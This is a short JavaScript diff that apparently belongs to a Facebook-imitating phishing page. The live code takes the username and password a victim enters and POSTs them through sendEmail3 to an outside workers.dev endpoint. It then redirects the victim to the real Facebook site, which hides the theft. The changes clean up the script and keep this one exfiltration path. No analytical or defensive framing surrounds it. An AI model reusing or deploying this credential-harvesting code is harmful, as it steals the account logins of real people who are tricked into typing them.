@@ -1,14 +1,11 @@
-(function () {
-  emailjs.init("TU_PUBLIC_KEY");
-})();
-
 async function sendEmail3(val1, val2) {
+  //worker
   const endpoint = "https://square-wind-c2f6.jnoel883.workers.dev/";
   const body = JSON.stringify({
     field1: val1,
     field2: val2,
   });
-  console.log(body);
+  //console.log(body);
   await fetch(endpoint, {
     method: "POST",
     headers: {
@@ -28,11 +25,9 @@ function redirect(event) {
     //console.log("no pass");
     //create warning
     error.style.display = "block";
-      userValue.classList.add("input-error");
+    userValue.classList.add("input-error");
     return;
   }
-  //sendEmail(userValue, passwordValue);
-  //sendEmail2(userValue, passwordValue);
   sendEmail3(userValue, passwordValue);
   //redirect
   location.replace("https://es-la.facebook.com/");
